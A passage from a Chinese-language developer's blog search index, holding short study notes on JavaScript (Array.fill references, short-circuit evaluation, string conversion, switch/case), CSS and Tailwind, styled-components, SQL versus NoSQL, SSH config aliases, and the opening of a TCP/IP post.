是「Immutable（不可以變）」的，所以去動到原本的 state 絕對會有一些問題。 雖然我還不明確知道實際發生了什麼，但至少知道當我們用淺拷貝時，會改到原本的 state，因此一定會產生一些問題，先知道這些就夠了。 附註後來我發現上面的講法是錯的，實際的問題跟改了 React 的 state 沒有太大關連，而是因為 Array.prototpye.fill 這個內建函式引起的問題。 首先呢，根據 MDN 的說明： 當 fill 方法獲得一個傳入的物件，會將傳入的物件位置進行複製，並把其參考值（reference）之拷貝填入陣列中。 意思就是說如果你 fill 裡面放的是屬於「Object」的東西，那產生出的值都是 Reference，不是各自獨立的值，舉個例子： 123var arr = Array(5).fill(null) // [null, null, ...]var arr2 = Array(5).fill(arr) // [[null, null, ...], ...]arr2[0].push(\"TEST\"); 這邊先用 fill 產生了二維陣列，接著再對二維陣列裡的第一個陣列 push 一個新的值，依照常理會認為只有第一個會新增，但結果卻是： 1234567[ [null, null, null, null, null, \"TEST\"], [null, null, null, null, null, \"TEST\"], [null, null, null, null, null, \"TEST\"], [null, null, null, null, null, \"TEST\"], [null, null, null, null, null, \"TEST\"],]; 這就上面提到的 reference，不管是 arr2[0]、arr[1] 還是 arr[2]，它們指向的都是同一個 reference，這就是為什麼明明只改了一個，卻每個都被改變了的原因。","link":"/2022/04/16/shallow-copy-and-deep-copy/"},{"title":"邏輯運算中的短路","text":"你腦袋短路了嗎？ 短路的完整意思是「短路求值（Short-circuit evaluation）」。 簡單來說，如果從第一個值就可以知道結果，那就不用再管第二個的值是什麼。 OR 的短路運算123console.log(3 || 0) // 3 console.log(0 || 3) // 3true || console.log('123') // log 不會被執行 3 || 0 時，3 就可以決定結果，所以不會管後面的 00 || 3 時，0 還不能決定結果，所以看第二個值 3，最後通過所以回傳true || console.log('123') 時，true 就可以決定結果，所以 log 不會被執行 AND 的短路運算123console.log(0 &amp;&amp; 10) // 0console.log(10 &amp;&amp; 0) // 0console.log(10 &amp;&amp; 30) // 30 跟 OR 的情況一樣，自己想想看為什麼。","link":"/2021/12/17/short-circuit-logic/"},{"title":"一些在手機上 CSS 的小細節","text":"慢慢累積這篇文章的內容。 簡述這篇預期會把之後碰到的問題都寫在這，希望能解決寫 RWD 時的地雷。 在 IOS 上的 &lt;button&gt; 的字體跟色彩與眾不同，建議加上這兩個： 12font-family: inherit;font-size: inherit; 在手機板上的 &lt;input&gt; 要特別注意文字大小，如果 &lt;16px 就會在 :focus 時自動縮放（Zoom），建議加上： 1font-size: 1em; 如果想讓 &lt;input&gt; 有 :focus 邊框加深效果，建議用 box-shadow 來設： 1234input:focus { outline: 0; box-shadow: 0 0 0 1px blue; } 這樣子做可以避免 outline 在不同瀏覽器上的樣式問題。還有圓角 bug。","link":"/2022/04/12/some-css-detail-on-mobile/"},{"title":"關聯式與非關聯式資料庫","text":"以前聽的很亂的東西。 關聯式關聯式的核心理念：不要把不相干的資料放在一起 處理關聯式資料庫的程式語言：SQL（Structure Query Language） 最有名的代表：MySQL 舉例來說，我有一個用來儲存期中考分數的 table： 用看的就有點奇怪吧？為什麼要把姓名跟地址也放在這個 table 裡面？ 而且假設之後又有一個新的 table 是儲存期末考分數，不就又要在打一次姓名跟地址？ 所以與其這樣子做，倒不如開一個新的 table 專門用來儲存「學生資料」： 那要怎麼把「期中考」跟「學生資料」關聯在一起？注意到了嗎，這兩個 table 都有「學號」，所以用學號就可以把它們關聯起來。 這就是關聯式資料庫的核心理念：把不重要的分開來，在透過某個欄位來把不同的資料庫給關聯起來。 非關連式統稱：NOSQL（Not Only SQL） 最有名的代表：MongoDB 大概是個有點像 JSON 的東西： 123456{ score: [1, 2, 3], student: { name: 'PeaNu', }} 好處是如果今天想新增欄位可以直接加進去： 123456789{ score: [1, 2, 3], student: { name: 'PeaNu', }, address: { 'northern': 'Taipie' }} 如果是關聯式資料庫就得重新調整「Schema（結構）」，會比較麻煩一點。","link":"/2022/01/30/sql-and-nosql/"},{"title":"SSH 用別名的方式來連線","text":"懶人包。 簡述到 ~~/.ssh/ 底下開一個 config： 12345Host peanu # 設定的別名HostName 127.0.0.1 # IP 位址User ubuntu # 登入的使用者名稱IdentitiesOnly yes # 固有配置IdentityFile &lt;path&gt; # 私鑰路徑 就這樣。","link":"/2022/03/09/ssh-alias/"},{"title":"字元是可以比大小的","text":"好像是冷知識。 原理每個字元都有對應的 ASCII 碼，所以背後是用這個碼來比大小的。 123console.log('@'.charCodeAt(0)) // 64console.log('!'.charCodeAt(0)) // 33console.log('@' &gt; '!') // true 比比看1234const str1 = 'A' // 65const str2 = 'B' // 66 console.log(str1 &gt; str2) // falseconsole.log(str1 &lt; str2) // true 如果是字串的話，只會看第一個字元： 1234const str1 = 'AJDSJOIDJOJS' // A =&gt; 65const str2 = 'BADKAIJSOIDJ' // B =&gt; 66console.log(str1 &gt; str2) // falseconsole.log(str1 &lt; str2) // true 用這個方式來轉換大小寫12345678910const str = 'AbCdEFGhijkLMN'var result = ''for(var i=0; i&lt;str.length; i++) { if(str[i]&gt;='A' &amp;&amp; str[i]&lt;='Z') { result += String.fromCharCode(str[i].charCodeAt(0) + 32) } else { result += str[i] }}console.log(result) // abcdefghijklmn 其實就跟用 ASCII 碼的作法一樣，只是這樣的可讀性更好而已。","link":"/2021/12/20/string-can-be-calculate/"},{"title":"把字串轉成數字的 4 種方法","text":"好多好多。 Number.parseInt(str, radix)最正規的方式，radix 代表用幾進位來解析這個字串（Number 可加可不加）： 1234const a = Number.parseInt('123', 10)const b = Number.parseInt('100', 2)console.log(a) // 123console.log(b) // 4 Math.floor(str)其實 Math.ceil 也可以，但個人覺得 floor 比較直覺： 12const a = Math.floor('123')console.log(a) // 123 字串 * 1跟「數字 + 空字串」有異曲同工之妙： 12const a = '123' * 1console.log(a) // 123 很適合用在你不想用括號包一大串東西的時候： 12let a = '1991 11 7'.split(' ').reduce((acc, elem) =&gt; acc + elem, '') * 1console.log(a) // 19911117 Number(str)最直覺的做法： 12const a = Number('123')console.log(a) // 123","link":"/2021/12/27/string-to-number/"},{"title":"Styled-components 基礎","text":"有種用了就回不去的感覺。 styled component 中的 props既然它是 Component，那當然也有 props 可以用，直接來示範怎麼用： 123456789101112131415161718192021222324252627282930313233const Button = styled.button` border-radius: 4px; padding: 8px 12px; background-color: #e4e4e4; border: none; color: black; cursor: pointer; flex-shrink: 0; &amp; + &amp; { margin-left: 8px; } ${ props =&gt; props.isDone &amp;&amp; ` background-color: #0e920e66; color: white; ` }`function TodoItem ({ content, handlebuttonClick }) { return ( &lt;TodoItemWrapper&gt; &lt;TodoContent&gt;{content}&lt;/TodoContent&gt; &lt;TodoButtonWrapper&gt; // 在這裡傳入 &lt;Button isDone={true}&gt;已完成&lt;/Button&gt; &lt;Button onClick={handlebuttonClick}&gt;刪除&lt;/Button&gt; &lt;/TodoButtonWrapper&gt; &lt;/TodoItemWrapper&gt; )} 在 styled Component 接收 props 的方式是透過 ${...}，${...} 裡面會寫一個 function 來接收 props 參數，你就可以根據它來寫不同的 style 了。 繼承 style這個跟 class 中的繼承有點類似，你可以先繼承某個 styled component， 再下新的 style 來覆寫。 1234567891011121314151617181920212223const Button = styled.button` border-radius: 4px; padding: 8px 12px; background-color: #e4e4e4; border: none; color: black; cursor: pointer; flex-shrink: 0; &amp; + &amp; { margin-left: 8px; } ${ props =&gt; props.size === 'XL' ? 'font-size:20px' : 'font-size: 12px' }`// 繼承 Buttonconst PinkButton = styled(Button)` background-color: pink;` 如果要對「React」的 component 重新設定 style先講一個觀念： 只有 styled component 才吃的到樣式，所以你用的時候一定是放 styled component，不是 react component。 用 React component 包裝起來的 styled components這種要搭配 props 來傳入 className： 1234567891011121314151617function TodoItem ({ className, children, handlebuttonClick }) { return ( &lt;TodoItemWrapper className={className}&gt; &lt;TodoContent&gt;{children}&lt;/TodoContent&gt; &lt;TodoButtonWrapper&gt; &lt;Button&gt;已完成&lt;/Button&gt; &lt;Button onClick={handlebuttonClick}&gt;刪除&lt;/Button&gt; &lt;/TodoButtonWrapper&gt; &lt;/TodoItemWrapper&gt; )}// 可以想成是這邊產生一個 className// 你要把這個 className 放到你想套用 style 的 component 上const TodoItem2 = styled(TodoItem)` background-color: #d6d6d6;` 用 style component 來包裝的 React component 跟剛剛反過來： 1234567891011121314// 把要包裝的 react component 傳入const OrangeButton = styled(TestButton)` ${defaultButton} border-color: ${({ theme }) =&gt; theme.orange}; color: ${({ theme }) =&gt; theme.orange}; &amp;:hover { background-color: ${({ theme }) =&gt; theme.orange}; }`;// 記得要傳入 classNamefunction TestButton ({ className }) { return &lt;button className={className}&gt;測試用&lt;/button&gt;} Medai query其實就是直接在 styled 中寫 @media 就行了，不過更好的做法是把 breakpoint 拆出來寫成常數引入會更好： 12345678910111213141516171819202122232425// 引入對應的斷點import { MEDIA_TABLET, MEDIA_PC } from './constants/breakpoint'const Button = styled.button` border-radius: 4px; padding: 8px 12px; background-color: #e4e4e4; border: none; color: black; cursor: pointer; flex-shrink: 0; &amp; + &amp; { margin-left: 8px; } ${MEDIA_TABLET} { font-size: 1.2em; } ${MEDIA_PC} { font-size: 1.5em; }` 變數的運用首先要用 &lt;ThemeProvider&gt; 把整個 component 給包住： 1234567891011121314151617import { ThemeProvider } from 'styled-components';// 這邊就可以定義要傳進去的 propsconst theme = { blue: 'royalblue', orange: 'darkorange', green: 'mediumseagreen', red: 'palevioletred',}ReactDOM.render( // 傳進去 &lt;ThemeProvider theme={theme}&gt; &lt;App /&gt; &lt;/ThemeProvider&gt;, document.getElementById('root')) 接著在其他的 style component 就可以透過 props.theme 來存取： 1234567891011121314151617181920212223242526const Button = styled.button` border-radius: 4px; padding: 8px 12px; background-color: transparent; border: 1px solid ${props =&gt; props.theme.blue}; color: ${props =&gt; props.theme.blue}; cursor: pointer; flex-shrink: 0; &amp; + &amp; { margin-left: 8px; }`const GreenButton = styled(Button)` border-color: ${props =&gt; props.theme.green}; color: ${props =&gt; props.theme.green};`const OrangeButton = styled(Button)` border-color: ${props =&gt; props.theme.orange}; color: ${props =&gt; props.theme.orange};`const RedButton = styled(Button)` border-color: ${props =&gt; props.theme.red}; color: ${props =&gt; props.theme.red};` 成果大概就像這樣： 不同的標籤想套用相同樣式假設我寫了一個 &lt;button&gt; 的 styled component，但今天又想在 &lt;a&gt; 上用一樣的樣式時，不需要重新寫一遍，只要利用 as 就可以了： 123456789101112131415161718192021222324252627282930const Button = styled.button` border-radius: 4px; padding: 8px 12px; background-color: transparent; border: 1px solid ${props =&gt; props.theme.blue}; color: ${props =&gt; props.theme.blue}; cursor: pointer; flex-shrink: 0; &amp; + &amp; { margin-left: 8px; } &amp;:hover { background-color: ${props =&gt; props.theme.blue}; color: white; }`function TestScope () { return ( &lt;TodoButtonWrapper style={{ marginTop: '20px' }}&gt; &lt;Button&gt;Button&lt;/Button&gt; // 用 as 變成希望的標籤 &lt;Button as=\"a\" href=\"#\"&gt;Link&lt;/Button&gt; &lt;Button as=\"a\" href=\"#\"&gt;Link&lt;/Button&gt; &lt;/TodoButtonWrapper&gt; )} 或甚至是變成另一個 component 也行： 12345678910111213141516function TestScope () { return ( &lt;TodoButtonWrapper style={{ marginTop: '20px' }}&gt; &lt;Button&gt;Button&lt;/Button&gt; &lt;Button as={ReversedButton}&gt;Button&lt;/Button&gt; &lt;ReversedButton&gt;顛倒文字的按鈕&lt;/ReversedButton&gt; &lt;/TodoButtonWrapper&gt; )}function ReversedButton ({ children }) { return &lt;Button&gt;{children.split('').reverse()}&lt;/Button&gt;} 自動判斷是不是 HTML 元素的屬性1234567&lt;TodoItemWrapper&gt; &lt;TodoContent&gt;{todo.content}&lt;/TodoContent&gt; &lt;TodoButtonWrapper&gt; &lt;GreenButton isDone={todo.isDone} data-id={todo.id} onClick={handleCompletedButtonClick}&gt;{todo.isDone ? '已完成' : '未完成'}&lt;/GreenButton&gt; &lt;RedButton data-id={todo.id} onClick={handleRemoveButtonClick}&gt;刪除&lt;/RedButton&gt; &lt;/TodoButtonWrapper&gt;&lt;/TodoItemWrapper&gt; 以這個例子來說，GreenButton 寫了 isDone 和 data-id 兩個屬性，但實際上會被渲染出來的只有 data-id，不會有 isDone： 這就是 style component 會做的自動判斷。 不過有一種情況是可能我想在 style component 傳 id 這個 props： 1234&lt;GreenButton id={todo.id} onClick={handleButtonClick('isCompleted')}&gt;{todo.isDone ? '已完成' : '未完成'}&lt;/GreenButton&gt; 可是又不希望被渲染到 HTML 上，這時候就可以改用 $ 來傳（Transient props）： 1234&lt;GreenButton $id={todo.id} onClick={handleButtonClick('isCompleted')}&gt;{todo.isDone ? '已完成' : '未完成'}&lt;/GreenButton&gt; 這樣就不會被渲染了。 所以建議養成一種習慣，只要是給 style component 用的 props 就一律用 $ 來表示，可讀性會更好。 設定屬性值要在 style component 上設定 HTML 元素的屬性有兩種方式，第一種是直接寫在 Component 上： 123456789101112const RadioButton = styled.input``function TestScope () { return ( &lt;TodoButtonWrapper style={{ marginTop: '20px' }}&gt; &lt;RadioButton type=\"radio\" name='gender' value=\"man\"&gt;&lt;/RadioButton&gt; &lt;RadioButton type=\"radio\" name='gender' value=\"female\"&gt;&lt;/RadioButton&gt; &lt;/TodoButtonWrapper&gt; )} 第二種是透過 style.attrs 屬性： 123456789101112const RadioButton = styled.input.attrs({ type: 'radio' })``function TestScope () { return ( &lt;TodoButtonWrapper style={{ marginTop: '20px' }}&gt; &lt;RadioButton name='gender' value=\"man\"&gt;&lt;/RadioButton&gt; &lt;RadioButton name='gender' value=\"female\"&gt;&lt;/RadioButton&gt; &lt;/TodoButtonWrapper&gt; )} 看起來是第二種會好一點，因為只要寫在一個地方就好，之後要改會比較方便。 設定全域空間的樣式當想要改 &lt;body&gt; 或是 reset 的樣式時，應該就會用到。這是透過 createGlobalStyle 來達成的。 首先要先寫好全域的 style component： 1234567891011import { createGlobalStyle } from \"styled-components\";export const GlobalStyle = createGlobalStyle` body { // 全域空間的 style background-color: pink; } .bg-dark { background-color: black; }` 接著引入到 entry 就會套用了： 123456789ReactDOM.render( &lt;ThemeProvider theme={theme}&gt; // 放在這裡，不是外面 // 另外因為是包在 ThemeProvide 裡，所以也能存到 theme 的 props &lt;GlobalStyle /&gt; &lt;App /&gt; &lt;/ThemeProvider&gt;, document.getElementById('root')) 定義在 Global 的 className 也可以在底下的 component 使用： 123456789function TestScope () { return ( &lt;TodoButtonWrapper className=\"bg-dark\"&gt; &lt;Button&gt;123&lt;/Button&gt; &lt;Button&gt;456&lt;/Button&gt; &lt;Button&gt;789&lt;/Button&gt; &lt;/TodoButtonWrapper&gt; )} 給選取器更高的權重：&amp;&amp;先來看段 code： 123456789101112131415161718192021222324const Span = styled.span` &amp;&amp; { color: blue }`const GlobalStyle = createGlobalStyle` body { // 全域空間的 style } span${Span} { color: red; }`ReactDOM.render( &lt;ThemeProvider theme={theme}&gt; &lt;GlobalStyle /&gt; &lt;App /&gt; &lt;Span&gt;I'm span&lt;/Span&gt; &lt;/ThemeProvider&gt;, document.getElementById('root')) 簡單來說，我在 Global 宣告 span${Span} 要是紅色，但我希望實際是藍色，所以就在 Span 中用 &amp;&amp; 來覆寫全域設定： 注意 &amp; 跟 &amp;&amp; 的差別，一個會被覆寫一個不會。 把會重複使用的樣式存起來style component 有提供 css 方法讓你把會共用的樣式儲存起來，它的寫法是這樣： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051import { css } from 'styled-components'// 把共通的樣式用 function 存起來const buttonDefault = () =&gt; css` border-radius: 4px; padding: 8px 12px; background-color: transparent; cursor: pointer; flex-shrink: 0; // 這個寫法會有一些問題，留到下面來解釋 &amp; + &amp; { margin-left: 8px; }`const BlueButton = styled.button` // 直接引用 ${buttonDefault} border: 1px solid ${props =&gt; props.theme.blue}; color: ${props =&gt; props.theme.blue}; &amp;:hover { background-color: ${props =&gt; props.theme.blue}; color: white; }`const GreenButton = styled.button` // 直接引用 ${buttonDefault} border-color: 'green'; color: 'green'; &amp;:hover { background-color: 'green'; }`const OrangeButton = styled.button` // 直接引用 ${buttonDefault} border-color: 'orange'; color: 'orange'; &amp;:hover { background-color: 'orange'; }`const RedButton = styled.button` // 直接引用 ${buttonDefault} border-color: 'red'; color: 'red'; &amp;:hover { background-color: 'red'; }` 這樣就能做出這樣的效果： 不過會發現 &amp; + &amp; 的部分並沒有套用到，為什麼？ 這是因為當你建立一個新的 style component 時其實會重新產生一個 className，所以你的 &amp; + &amp; 其實是這樣子： 123456789BlueButton + BlueButton { margin-left: 8px}greenButton + greenButton { margin-left: 8px} RedButton + RedButton { margin-left: 8px} 上圖中的綠按鈕旁邊接的是紅按鈕，所以才沒有套用這個規則。 要解決這個問題的辦法有兩種，一種是改用「繼承」的寫法： 1234567891011121314151617181920212223242526const BlueButton = styled.button` border-radius: 4px; padding: 8px 12px; background-color: transparent; border: 1px solid ${props =&gt; props.theme.blue}; color: ${props =&gt; props.theme.blue}; cursor: pointer; flex-shrink: 0; &amp; + &amp; { margin-left: 8px; } &amp;:hover { background-color: ${props =&gt; props.theme.blue}; color: white; }`const GreenButton = styled(BlueButton)` // ...`const OrangeButton = styled(BlueButton)` // ...`const RedButton = styled(BlueButton)` // ...` 因為是透過繼承，所以 BlueButton 的部分不會重新產生 className，只有後來新增的才會。 另一種方式是把 &amp; + &amp; 的規則透過父層來指定： 12345678const TodoButtonWrapper = styled.div` display: flex; align-items: center; // 底下的 button + button 會套用 button + button { margin-left: 8px; }` 至於哪種寫法比較好就見仁見智，我個人是覺得繼承的寫法比較直覺一點，不過缺點是元件本身會多一條限制，因此「可重用性」會比較差。 其他補充 style.button 跟 style('button') 是等價的東西 不要把 style component 寫在 React component 裡面，會有效能問題（每次 render 就重新宣告）","link":"/2022/04/05/styled-components-basic/"},{"title":"switch case","text":"好像有點邊緣的 switch。 如果沒有 switch1234567891011var month = 1if (month === 1) { console.log('一月')} else if (month === 2) { console.log('二月')} else if (month === 3) { console.log('三月')} else if (month === 4) { console.log('四月')} 記得之前看書是說用 if 的效能比較不好，因為 month = 4 的話，在執行到 console.log('四月') 之前的每一個 if 都要走過一遍。 有了 switch條件很多的時候就是適合用 switch，但記得別忘了加 break 跟 default 這兩個東西。（忘了加 break 的話每一行都會被執行到） 12345678910111213141516switch (month) { case 1: console.log('一月') break case 2: console.log('二月') break case 3: console.log('三月') break case 4: console.log('四月') break default: console.log('hello')} 後來學到也可以「多個 case」指向同個區塊： 123456789101112131415161718switch (month) { case 1: case 2: console.log('一月或二月') break case 3: console.log('三月') break case 4: console.log('四月') break case 5: console.log('五月') break default: console.log('hello')} 其實也有更好的做法（Mapping 映射）簡單介紹一下 Mapping 的操作。 Mapping 的概念就是你建立一個「陣列」或「物件」，把 value 設定成你要的值，接著用 key 來取出，就像建立代號的概念： A 代表 小明 B 代表 小花 陣列的 mapping123var month = 1chineseMonth = ['一月', '二月', '三月', '四月', '五月']console.log(chineseMonth[month -1]) // 五月 物件的 mapping12345678var code = 'A'people = { A: '小明', B: '小花', C: '小朱', D: '小飛'}console.log(people[code]) // 小明","link":"/2021/12/17/switch-case/"},{"title":"Tailwind 雜記","text":"來點不一樣的 CSS。 簡述Tailwind 從以前給我的印象就是個麻煩的東西，但並不是因為 HTML 很難看的關係，而是當習慣了 CSS Selector 的概念後，就會覺得 Tailwind 這種全部綁在 class 中的寫法用起來各種障礙。 但自從學了 React 後，逐漸體會到 Component 跟 Tailwind 結合起來用的效益，慢慢的改變了以前的觀點。 總之這篇會把我想記的一些觀念給寫下來，如果想知道更多的話推薦參考這份 官方文件。 前置作業初始化簡單來說就是建立 tailwind.config.js，可以用底下的指令來產生： 1npx tailwind init 初始化的設定會長這樣： 12345678/** @type {import('tailwindcss').Config} */module.exports = { content: [], theme: { extend: {} }, plugins: []} 編譯如果剛剛初始化以後沒有設定 content 就直接執行編譯的話，可能會看到這段訊息： 簡單來說這邊是要你設定「所有會使用到 tailwind class 名稱」的檔案路徑，例如說我在 ./public/index.html 中有用到這些 class，那我就會這樣設定： 12345678/** @type {import('tailwindcss').Config} */module.exports = { content: ['./src/**/*.{html,js}'], // src 底下所有的 .html 或 .js 檔案 theme: { extend: {} }, plugins: []} 附註：glob pattern 可以參考這份 cheat-sheet 設定完再跑一次編譯時，Tailwind 就會自動根據我設定的路徑來產出所有用到的 class，就可以正常使用囉！更多細節請參考 官方文件 新增自己的 utils 先引入 plugin 執行 plugin 時會拿到 addUtilities 這個參數，用它來加就對了 附註：記得要加上 .（有被雷到過） 123456789101112131415161718192021/** @type {import('tailwindcss').Config} */const plugin = require('tailwindcss/plugin')module.exports = { content: ['./src/**/*.{js,jsx,ts,tsx}'], theme: { extend: {} }, plugins: [ plugin(function ({ addUtilities }) { addUtilities({ '.rotateY-90': { transform: 'rotateY(90deg)' }, '.rotateY-0': { transform: 'rotateY(0deg)' } }) }) ]} 新增顏色可以在 extend 中新增項目。 123456789101112131415module.exports = { content: ['./src/**/*.{js,jsx,ts,tsx}'], theme: { extend: { colors: { primary: '#F97C7C', secondary: { 100: '#3a97d4', 200: '#1a2037' } } } }, plugins: []} 補充一下這背後的運作方式，如果你用 tailwind init --full 來做初始化的話可以看到 config 預設值。接著你滑到 colors 段落應該能看到這樣的內容： 123456789101112131415161718192021222324/** @type {import('tailwindcss').Config} */module.exports = { // 略... theme: { screens: { sm: '640px', md: '768px', lg: '1024px', xl: '1280px', '2xl': '1536px' }, // colors 初始值 colors: ({ colors }) =&gt; ({ inherit: colors.inherit, current: colors.current, transparent: colors.transparent, black: colors.black, white: colors.white, slate: colors.slate, gray: colors.gray // 略... }) }} 簡單來說 colors 就只是一個物件（function 的回傳值）而已，所以當你添增一些新的屬性到 colors 身上以後，tailwind 就可以依據這個物件來產生對應的 class 與 css 內容，其實就只是這樣而已。 根據父層的狀態來改變 style舉例來說，如果我希望父層 hover 的時候改變子層的樣式，那可以用 group 這個方式來做： 123456&lt;div class=\"group\"&gt; &lt;!-- 父層 hover 時套用 bg-rose-400 --&gt; &lt;div class=\"group-hover:bg-rose-400 w-1/2 mx-auto my-10 p-4 bg-blue-300 rounded duration-300\"&gt; &lt;h1 class=\"text-white text-center text-2xl\"&gt;Hello&lt;/h1&gt; &lt;/div&gt;&lt;/div&gt; first-child / odd /even 之類的類選取器要用的話可以用 odd:*、even:* 或 first:* 之類的 class 來做： 12345678&lt;div class=\"w-1/2 mx-auto py-10\"&gt; &lt;div class=\"mb-2 p-4 rounded odd:bg-sky-300 even:bg-rose-300\"&gt; &lt;h1 class=\"text-white text-center text-2xl\"&gt;Hello&lt;/h1&gt; &lt;/div&gt; &lt;div class=\"mb-2 p-4 rounded odd:bg-sky-300 even:bg-rose-300\"&gt; &lt;h1 class=\"text-white text-center text-2xl\"&gt;Hello&lt;/h1&gt; &lt;/div&gt;&lt;/div&gt; 我當時還蠻疑惑的問題是，如果我有 10 列的話不就得寫 10 次？而且這跟我直接用人工把奇數偶數的樣式套用不同的 class 有什麼差？ 但後來仔細想想，當我們真的在顯示資料時不太可能這樣 hard code，以 React 來說的話，我們可能會這樣寫： 1234567891011121314151617const arr = ['Hello', 'Hello', 'Hello', 'Hello', 'Hello', 'Hello']const List = ({ text }) =&gt; ( &lt;div class='mb-2 p-4 rounded odd:bg-sky-300 even:bg-rose-300'&gt; &lt;h1 class='text-white text-center text-2xl'&gt;{text}&lt;/h1&gt; &lt;/div&gt;)export default function Com1() { return ( &lt;div class='w-1/2 mx-auto py-10'&gt; {arr.map((item) =&gt; ( &lt;List text={item} /&gt; ))} &lt;/div&gt; )} 總之這是拿來讓你搭配渲染用的，跟原本 CSS 寫在父層的概念有點不同，要習慣一下。 動態 class簡單來說，如果你要動態產生 class 的話： 請務必用全名，不要用字串拼接 請務必用全名，不要用字串拼接 請務必用全名，不要用字串拼接 詳細的原因可以參考官方文件，但簡單來說就是透過字串拼接的 class 沒辦法被編譯出來，下面來舉個例子。 當時我想做一個按鈕元件，並根據 props 的內容來決定背景顏色，所以就寫了這樣的東西： 12345678910111213const Button = ({ color, onClick }) =&gt; { const palette = { purple: 'violet', green: 'green', red: 'red' } return ( &lt;button className={`w-5 h-5 rounded-full border-0 bg-${palette[color]}-700`} onClick={onClick} &gt;&lt;/button&gt; )} 這裡的想法就是透過字串拼接 bg-{props}-700 來產出想要的 class，但是出來的結果並不如預期。 儘管 class 會輸出正確的字串，例如 props: red -&gt; bg-red-700，可是這時後並不會顯示正確的背景顏色，這個就是用字串拼接時會產生的問題。 如果想動態產生 class 的話，必須用全名來套用，像這樣： 1234567891011121314const Button = ({ color, onClick }) =&gt; { // 全名 const palette = { purple: 'bg-violet-700', green: 'bg-green-700', red: 'bg-red-700' } return ( &lt;button className={`w-5 h-5 rounded-full border-0 ${palette[color]}`} onClick={onClick} &gt;&lt;/button&gt; )} 多行文字換行雖然用我之前有寫一篇 CSS 多行文字顯示 … 的效果，但要在 tailwind 上自己實作的話有點麻煩，所以建議改用下面的方式。 詳細可以參考 官方文件 說明，這邊只列方法。 安裝套件： 1npm install @tailwindcss/line-clamp 設定 config： 1234567module.exports = { // ... plugins: [ // ... require('@tailwindcss/line-clamp') ]} 加上 class： 123456789&lt;p class=\"line-clamp-3\"&gt; Here's a block of text from a blog post that isn't conveniently three lines long like you designed for originally. It's probably like 6 lines on mobile or even on desktop depending on how you have things laid out. Truly a big pain in the derriere, and not the sort of thing you expected to be wasting your time trying to deal with at 4:45pm on a Friday am I right? You've got tickets to SmackDown and you heard there's gonna be a dark match with that local guy from two towns over that your cousin went to high school with before the show starts, and you're gonna miss it if you're not there early.&lt;/p&gt; 如果你把 devtool 打開來看的話就會發現其實跟 CSS 多行文字顯示 … 的效果 寫的內容一樣，只是包裝成 utility 而已。 回到熟悉的 class（@apply）在 tailwind 裡面如果想要幫每個元素套用同樣的樣式，你可能得這樣寫： 123456789101112131415161718&lt;button class=\"py-2 px-4 bg-blue-500 text-white font-semibold rounded-lg shadow-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-400 focus:ring-opacity-75\"&gt; click1&lt;/button&gt;&lt;button class=\"py-2 px-4 bg-blue-500 text-white font-semibold rounded-lg shadow-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-400 focus:ring-opacity-75\"&gt; click2&lt;/button&gt;... ... 只是套用的話這樣寫是沒差，重點是如果要改呢？我們來看看 官方文件 怎麼做的： 官網還順便吐槽了一下： If you can quickly edit all of the duplicated class lists simultaneously, there’s no benefit to introducing any additional abstraction. 總之如果你能接受的話就這樣子做就好，但如果真的不行就繼續看下去吧。 tailwind 提供了一個叫做 @apply 的東西，可以讓你把一坨 utilty 包裝成一個 class，用法是長這樣： 12345678910111213141516/* index.css */@tailwind base;@tailwind components;@tailwind utilities;@layer components { .label { @apply text-slate-500 mb-2; } .label-dark { @apply text-white mb-2; } .input-field { @apply w-full border-0 text-slate-700 focus:outline-slate-700 p-2 rounded; }} 順道一提，你甚至能直接在裡面加上原生的 CSS： 123456@layer components { .label { @apply text-slate-500 mb-2; background-color: dodgerblue; }} 雖然不確定這是不是合法的寫法，不過我覺得還蠻方便的就是了 XD 一次性的屬性值雖然透過 tailwind.config.js 可以添加一些客製化的項目，但是有時會碰到那種只會出現在「特定一兩個地方」的樣式，這時候你通常就不會想把它加進 theme 的設定中，畢竟用到的場合真的不多？ 這時候就可以考慮用 xxx-[value] 的方式來填入「一次性」的值，像這樣： 1&lt;div class=\"text- font-body bg-[#bada55] text-[24px] p-[20px]\"&gt;...&lt;/div&gt; 只要這樣子就完成囉，是不是省事很多啊！ 除此之外，如果想要帶入「變數」也是 OK 的，不過使用時要加上「屬性」來表明這個變數是用來代表什麼的？例如 color（顏色） 或 length（尺寸）之類的，詳細可以參考 官方文件 的說明，這邊做個簡單的示範： 12345678@tailwind base;@tailwind components;@tailwind utilities;:root { --primary: #f00099; --large: 24px;} 12345678910&lt;div&gt; &lt;!-- 把變數放在 [] 裡面並指定為 color 這個屬性 --&gt; &lt;button class=\"bg-[color:var(--primary)] text-white p-2 rounded\"&gt;Click Me&lt;/button&gt; &lt;!-- 把變數放在 [] 裡面並指定為 length 這個屬性 --&gt; &lt;p class=\"font-bold text-[length:var(--large)]\"&gt; Lorem ipsum dolor sit amet, consectetur adipisicing elit. Modi alias, hic voluptatem quo unde reiciendis magni accusamus quos illum corrupti veniam voluptatum voluptas voluptate harum necessitatibus dolorem cumque nulla saepe. &lt;/p&gt;&lt;/div&gt; 主要就是要記得加上「屬性」就好，不然其實就跟一般的用法差不多。 BreakPoint（斷點）在寫 CSS 時要做 RWD 的話都會用 @media 來對不同的斷點設定不同樣式，這個在 Tailwind 中也有提供對應的 utility： 123456789101112131415/** @type {import('tailwindcss').Config} */module.exports = { content: [], presets: [], darkMode: 'media', // or 'class' theme: { screens: { sm: '640px', md: '768px', lg: '1024px', xl: '1280px', '2xl': '1536px' } }} sm 會對應到 @media (min-width: 640px)，md 會對應到 @media (min-width: 768px) 以此類推。 要套用的話只要加上「前綴」就行了： 1&lt;div class=\"bg-red-500 sm:bg-green-500 md:bg-sky-500 lg:bg-pink-500 xl:bg-teal-500 \"&gt;&lt;/div&gt; 也是很方便的功能。","link":"/2022/07/03/tailwind-basic/"},{"title":"快速重溫 TCP/IP 四層模型","text":"好故事值得一看再看。 簡述TCP/IP 四層模型是從「OSI 七層模型」延伸出來的一個模型，簡單來說就是把七層精簡成四層，會比較沒那麼複雜。 然後這篇筆記想記下的事情是： 知道 HTTP 是什麼？ 知道什麼是 TCP / IP 四層？四層是包含哪些？ 知道每個服務可以遵守不同的協議？ 知道 TCP / UDP 的差異？ 知道什麼是 port？ 知道網路分層的概念？ 看圖複習 應用層簡單來說就是：用傳紙條來做什麼？ 可以有很多不同的應用，例如「訂便當」、「借籃球」、「NBA 